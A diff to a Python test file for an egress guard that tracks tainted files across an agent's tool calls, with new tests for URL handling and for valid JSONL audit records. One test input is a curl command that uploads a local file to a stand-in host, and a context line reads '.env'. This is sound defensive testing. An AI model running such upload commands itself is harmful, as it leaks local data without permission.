@@ -130,6 +130,19 @@ effect_state.observe(effect_state.state_for("s2"), "fs.read", {"path": ".env"})
 effect_state.reset("s2")
 check("B8 reset drops one session's state",
       effect_state.describe(effect_state.state_for("s2"))["tainted"] == [])
+# 2026-11-22 (review): a URL is not a filesystem path. PATHISH matches URL path
+# segments, so a sensitive substring in a URL used to block legitimate egress.
+check("B9 a URL whose path segment says 'secret' is not a local path",
+      effect_state.egress_path({}, "shell.exec", {
+          "command": "curl https://api.example.com/secret"}) == "")
+check("B10 an http.fetch URL named token.json is allowed with no prior read",
+      effect_state.egress_path({}, "http.fetch", {
+          "url": "https://cdn.example.com/token.json"}) == "")
+_st = {"tainted": {"scratch/report.txt": True}}
+check("B11 a tainted local file beside a sensitive-looking URL is still blocked",
+      effect_state.egress_path(_st, "shell.exec", {
+          "command": "curl -F f=@scratch/report.txt https://api.example.com/secret"})
+      == "scratch/report.txt")
 
 # ── C · the audit ledger ────────────────────────────────────────────────────
 SID = "v1250sess"
@@ -139,8 +152,21 @@ check("C1 the audit lands in a per-session jsonl", bool(p) and p.endswith(".repo
 rows = [json.loads(x) for x in open(p, encoding="utf-8") if x.strip()]
 check("C2 the row keeps the verdict and a timestamp",
       rows and rows[0]["verdict"] == "unsupported" and "ts" in rows[0])
+# 2026-11-22 (review): the old bound sliced the serialised text and could cut a
+# JSON string, leaving a line `json.loads` rejects. A large record must stay valid.
+big = {"verdict": "unsupported", "session": SID,
+       "findings": [{"object": "x" * 500, "why": "y" * 500} for _ in range(60)]}
+p = stores.append_report_audit(SID, big)
+lines = [x for x in open(p, encoding="utf-8") if x.strip()]
+try:
+    parsed = [json.loads(x) for x in lines]
+except Exception:  # noqa: BLE001 — the point of the check
+    parsed = []
+check("C3 a large record is still valid JSONL, never a byte slice",
+      len(parsed) == len(lines) and parsed[-1].get("truncated") is True,
+      "%d lines, %d parsed" % (len(lines), len(parsed)))
 stores._purge_session_artifacts(SID)
-check("C3 the ledger joins the delete cascade", not os.path.exists(p))
+check("C4 the ledger joins the delete cascade", not os.path.exists(p))
 
 # ── D · the headless groups ─────────────────────────────────────────────────
 def forge(*argv):
